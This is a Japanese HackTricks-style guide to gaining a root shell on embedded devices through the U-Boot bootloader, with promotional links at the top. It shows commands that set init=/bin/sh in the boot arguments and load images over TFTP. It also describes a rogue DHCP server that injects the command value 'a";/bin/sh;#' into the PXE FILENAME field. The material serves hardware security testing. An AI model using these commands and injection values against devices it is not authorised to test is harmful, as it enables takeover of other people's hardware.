<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合**は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

デバイスの起動構成やU-bootなどのブートローダーを変更するために推奨される手順は次のとおりです：

1. **ブートローダーのインタープリターシェルにアクセス**:
- 起動中に、「0」、「スペース」、または他の特定の「マジックコード」を押して、ブートローダーのインタープリターシェルにアクセスします。

2. **ブート引数の変更**:
- 以下のコマンドを実行して、ブート引数に '`init=/bin/sh`' を追加し、シェルコマンドを実行できるようにします：
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **TFTPサーバーの設定**:
- ローカルネットワークを介してイメージをロードするためにTFTPサーバーを構成します：
%%%
#setenv ipaddr 192.168.2.2 #デバイスのローカルIP
#setenv serverip 192.168.2.1 #TFTPサーバーのIP
#saveenv
#reset
#ping 192.168.2.1 #ネットワークアクセスを確認
#tftp ${loadaddr} uImage-3.6.35 #loadaddrはファイルをロードするアドレスとTFTPサーバー上のイメージのファイル名を取ります
%%%

4. **`ubootwrite.py`の利用**:
- `ubootwrite.py`を使用してU-bootイメージを書き込み、ルートアクセスを取得するために修正されたファームウェアをプッシュします。

5. **デバッグ機能の確認**:
- 冗長なログ記録、任意のカーネルの読み込み、または信頼されていないソースからのブートなどのデバッグ機能が有効になっているかどうかを確認します。

6. **注意深いハードウェア干渉**:
- デバイスの起動シーケンス中に1つのピンを接地に接続し、特にカーネルが展開される前にSPIまたはNANDフラッシュチップとやり取りする際には、極めて注意してください。ピンをショートする前にNANDフラッシュチップのデータシートを参照してください。

7. **ローグDHCPサーバーの設定**:
- デバイスがPXEブート中に摂取する悪意のあるパラメータを持つローグDHCPサーバーを設定します。Metasploitの（MSF）DHCP補助サーバーなどのツールを利用します。デバイスの起動手順の入力検証をテストするために、'FILENAME'パラメータを `'a";/bin/sh;#'` のようなコマンドインジェクションコマンドで変更します。

**注意**: デバイスのピンと物理的な相互作用を伴う手順（*アスタリスクでマークされています）は、デバイスを損傷させないように極めて注意して abord してください。


## 参考文献
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/) 

<details>
